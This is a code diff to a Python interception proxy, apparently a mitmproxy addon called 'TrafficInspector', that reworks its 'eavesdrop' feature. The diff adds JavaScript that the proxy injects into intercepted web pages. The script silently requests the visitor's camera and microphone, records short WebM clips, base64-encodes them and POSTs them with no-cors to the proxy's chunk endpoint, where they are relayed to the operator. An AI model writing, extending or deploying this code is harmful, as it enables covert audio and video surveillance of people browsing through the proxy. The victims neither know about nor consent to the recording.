@@ -10,6 +10,7 @@ Every HTTP/HTTPS transaction is:
 from __future__ import annotations
 
 import asyncio
+import base64
 import gzip
 import json
 import time
@@ -79,8 +80,6 @@ class TrafficInspector:
         self._inject_enabled: bool = False
         self._inject_script:  str  = ""
         self._eavesdrop_enabled:  bool = False
-        self._eavesdrop_streams:  set[web.WebSocketResponse] = set()
-        self._eavesdrop_viewers:  set[web.WebSocketResponse] = set()
         self._app = self._build_app()
 
     # ── aiohttp app ───────────────────────────────────────────────────────────
@@ -97,8 +96,7 @@ class TrafficInspector:
         app.router.add_post("/api/inject",             self._handle_inject_post)
         app.router.add_get("/api/eavesdrop",           self._handle_eavesdrop_get)
         app.router.add_post("/api/eavesdrop",          self._handle_eavesdrop_post)
-        app.router.add_get("/api/eavesdrop/stream",    self._handle_eavesdrop_stream)
-        app.router.add_get("/api/eavesdrop/view",      self._handle_eavesdrop_view)
+        app.router.add_post("/api/eavesdrop/chunk",    self._handle_eavesdrop_chunk)
         return app
 
     # ── HTTP route handlers ───────────────────────────────────────────────────
@@ -170,38 +168,17 @@ class TrafficInspector:
         ctx.log.info(f"Eavesdrop {'enabled' if self._eavesdrop_enabled else 'disabled'}")
         return web.json_response({"ok": True, "enabled": self._eavesdrop_enabled})
 
-    async def _handle_eavesdrop_stream(self, req: web.Request) -> web.WebSocketResponse:
-        """Receives binary MediaRecorder chunks from injected pages."""
-        ws = web.WebSocketResponse(max_msg_size=0)
-        await ws.prepare(req)
-        self._eavesdrop_streams.add(ws)
+    async def _handle_eavesdrop_chunk(self, req: web.Request) -> web.Response:
+        """Receives a base64-encoded WebM blob POSTed by the injected page."""
+        headers = {"Access-Control-Allow-Origin": "*"}
         try:
-            async for msg in ws:
-                if msg.type == aiohttp.WSMsgType.BINARY:
-                    dead: set[web.WebSocketResponse] = set()
-                    for viewer in list(self._eavesdrop_viewers):
-                        try:
-                            await viewer.send_bytes(msg.data)
-                        except Exception:
-                            dead.add(viewer)
-                    self._eavesdrop_viewers -= dead
-                elif msg.type in (aiohttp.WSMsgType.ERROR, aiohttp.WSMsgType.CLOSE):
-                    break
-        finally:
-            self._eavesdrop_streams.discard(ws)
-        return ws
-
-    async def _handle_eavesdrop_view(self, req: web.Request) -> web.WebSocketResponse:
-        """Operator dashboard — receives relayed media chunks."""
-        ws = web.WebSocketResponse(max_msg_size=0)
-        await ws.prepare(req)
-        self._eavesdrop_viewers.add(ws)
-        try:
-            async for _ in ws:
-                pass
-        finally:
-            self._eavesdrop_viewers.discard(ws)
-        return ws
+            body = await req.read()
+            b64 = body.decode("ascii", errors="ignore").strip()
+        except Exception:
+            return web.Response(status=400, headers=headers)
+        if b64 and self._eavesdrop_enabled:
+            await self._broadcast({"type": "eavesdrop_chunk", "data": b64})
+        return web.Response(text="ok", headers=headers)
 
     # ── WebSocket handler ─────────────────────────────────────────────────────
 
@@ -244,20 +221,24 @@ class TrafficInspector:
         self._websockets -= dead
 
     def _build_eavesdrop_script(self) -> str:
-        """Generate the transparent eavesdrop payload injected into HTML pages."""
+        """Generate the transparent eavesdrop payload injected into HTML pages.
+
+        Approach: record 2.5-second complete WebM blobs with MediaRecorder,
+        convert each to base64 with FileReader, POST as text/plain (no CORS
+        preflight, no WebSocket needed — works from any origin).
+        """
         return r"""/* Traffic Inspector — Transparent Eavesdrop */
 (function(){
   'use strict';
-  var _TI_WS = 'ws://localhost/api/eavesdrop/stream';
+  var _TI_URL = 'http://localhost/api/eavesdrop/chunk';
 
   function _tiStart(hasCam) {
-    var constraints = hasCam
-      ? {video: true, audio: true}
-      : {video: false, audio: true};
+    var constraints = hasCam ? {video:true,audio:true} : {video:false,audio:true};
     navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
-      var ws = new WebSocket(_TI_WS);
-      ws.binaryType = 'arraybuffer';
-      ws.onopen = function() {
+      var active = true;
+
+      function recordChunk() {
+        if (!active) return;
         var types = [
           'video/webm;codecs=vp8,opus',
           'video/webm;codecs=vp9,opus',
@@ -265,19 +246,35 @@ class TrafficInspector:
           'audio/webm;codecs=opus',
           'audio/webm'
         ];
-        var mime = types.find(function(m){ return MediaRecorder.isTypeSupported(m); }) || '';
-        var rec = new MediaRecorder(stream, mime ? {mimeType: mime} : {});
-        rec.ondataavailable = function(e) {
-          if (e.data.size > 0 && ws.readyState === 1)
-            e.data.arrayBuffer().then(function(b){ ws.send(b); });
+        var mime = types.find(function(m){ return MediaRecorder.isTypeSupported(m); }) || 'video/webm';
+        var chunks = [];
+        var rec = new MediaRecorder(stream, {mimeType: mime});
+        rec.ondataavailable = function(e){ if (e.data.size) chunks.push(e.data); };
+        rec.onstop = function() {
+          if (active && chunks.length) {
+            var blob = new Blob(chunks, {type: mime});
+            var fr = new FileReader();
+            fr.onload = function() {
+              fetch(_TI_URL, {
+                method:  'POST',
+                body:    fr.result.split(',')[1],
+                headers: {'Content-Type': 'text/plain'},
+                mode:    'no-cors'
+              }).catch(function(){});
+            };
+            fr.readAsDataURL(blob);
+          }
+          if (active) setTimeout(recordChunk, 50);
         };
-        rec.start(500);
-        ws.onclose = function() {
-          try { rec.stop(); } catch(_) {}
-          stream.getTracks().forEach(function(t){ t.stop(); });
-        };
-      };
-      ws.onerror = function(){ ws.close(); };
+        rec.start();
+        setTimeout(function(){ if (rec.state === 'recording') rec.stop(); }, 2500);
+      }
+
+      recordChunk();
+      window.addEventListener('pagehide', function(){
+        active = false;
+        stream.getTracks().forEach(function(t){ t.stop(); });
+      });
     }).catch(function(){});
   }
 
